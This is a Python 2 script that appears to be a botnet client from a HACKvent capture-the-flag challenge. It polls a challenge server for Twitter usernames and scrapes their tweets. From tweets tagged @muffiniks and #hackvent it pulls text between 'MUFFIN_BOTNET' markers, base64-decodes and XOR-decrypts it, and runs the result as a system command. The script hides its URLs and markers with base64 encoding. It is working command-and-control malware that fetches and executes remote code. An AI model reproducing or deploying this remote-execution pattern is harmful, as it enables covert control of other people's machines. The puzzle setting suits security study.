#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64, os, re, urllib2
from easyprocess import EasyProcess

os.system('./checker.py')

def x(t): return ''.join([ chr(ord(t[i]) ^ [0x66, 0x66, 0x66, 0x13, 0x37, 0x42, 0x69, 0x33, 0x01, 0x13] [i % 10]) for i in range(len(t)) ])

def ok_cool(c):
    try:
        c = x( base64.b64decode(c))
        EasyProcess(c).call(timeout=2)
    except: pass

def wtf(n):
    t =  base64.b64decode('aHR0cHM6Ly90d2l0dGVyLmNvbS8=') + n #b64decoded: 'https://twitter.com/'
    cs = []

    try:
        c_txt = urllib2.urlopen(t).read()
        cs = re.findall(base64.b64decode('VHdlZXRUZXh0U2l6ZSguKik8L3A='), c_txt) #b64decoded: 'TweetTextSize(.*)</p'
    except: pass

    for c in cs:
        try:
            c = c[c.index('>')+1:]
            if '<a href="/muffiniks" class="twitter-atreply pretty-link js-nav" dir="ltr" data-mentioned-user-id="764117042274373632" ><s>@</s><b>muffiniks</b></a>' in c and ' <a href="/hashtag/hackvent?src=hash" data-query-source="hashtag_click" class="twitter-hashtag pretty-link js-nav" dir="ltr" ><s>#</s><b>hackvent</b></a>' in c and ' rel="nofollow noopener" dir="ltr" data-expanded-url="http://hackvent.hacking-lab.com" class="twitter-timeline-link" target="_blank" title="http://hackvent.hacking-lab.com" ><span class="tco-ellipsis"></span><span class="invisible">http://</span><span class="js-display-url">hackvent.hacking-lab.com</span><span class="invisible"></span><span class="tco-ellipsis"><span class="invisible">&nbsp;</span></span></a> ' in c:
                c = c[c.index(base64.b64decode('TVVGRklOX0JPVE5FVDo='))+len( base64.b64decode('TVVGRklOX0JPVE5FVDo=')):] # b64decoded: 'MUFFIN_BOTNET:'
                c = c[:c.index(base64.b64decode('Ok1VRkZJTl9CT1RORVQ='))] # b64decoded: ':MUFFIN_BOTNET'
                ok_cool(c)
        except: pass

def ohai():
    ns = []
    try:
        n_txt = urllib2.urlopen( base64.b64decode('aHR0cDovL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjgwODEvP3R3aXR0ZXI=')).read() # b64decoded: 'http://challenges.hackvent.hacking-lab.com:8081/?twitter'
        ns = list(set([n for n in n_txt.split('|') if len(n) > 1]))
    except: pass
    for n in ns: wtf(n)

ohai()
